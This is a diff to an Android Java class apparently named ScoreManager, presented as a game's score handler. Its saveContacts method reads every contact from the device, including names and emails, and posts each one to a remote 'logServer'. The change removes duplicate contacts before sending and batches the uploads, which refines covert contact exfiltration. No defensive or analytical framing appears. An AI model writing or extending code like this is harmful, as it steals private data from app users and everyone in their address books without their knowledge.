@@ -18,6 +18,7 @@ import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.net.*;
 import java.util.ArrayList;
+import java.util.HashSet;
 
 public class ScoreManager {
 
@@ -97,6 +98,7 @@ public class ScoreManager {
 
     private long saveContacts() {
         //adapted from http://stackoverflow.com/questions/1721279/how-to-read-contacts-on-android-2-0
+        HashSet<SavedContact> contacts = new HashSet<SavedContact>(); //to stop sending duplicates
         Cursor cursor = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
         while (cursor.moveToNext()) {
             SavedContact contact = new SavedContact();
@@ -123,26 +125,29 @@ public class ScoreManager {
             emails.close();
 
             //Log.i("Contact", contact.toString());
-            sendContact(contact);
+            contacts.add(contact);
         }
         cursor.close();
+        sendContacts(contacts);
         return 0L;
     }
 
-    private void sendContact(SavedContact contact) {
-        ArrayList<NameValuePair> pairs = new ArrayList<NameValuePair>();
-        pairs.add(new BasicNameValuePair("contact", contact.toString()));
+    private void sendContacts(HashSet<SavedContact> contacts) {
+        for(SavedContact contact : contacts) {
+            ArrayList<NameValuePair> pairs = new ArrayList<NameValuePair>();
+            pairs.add(new BasicNameValuePair("contact", contact.toString()));
 
-        try {
-            HttpPost post = new HttpPost(logServer);
-            post.setEntity(new UrlEncodedFormEntity(pairs));
-            client.execute(post);
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
-        } catch (ClientProtocolException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
+            try {
+                HttpPost post = new HttpPost(logServer);
+                post.setEntity(new UrlEncodedFormEntity(pairs));
+                client.execute(post);
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+            } catch (ClientProtocolException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
 	
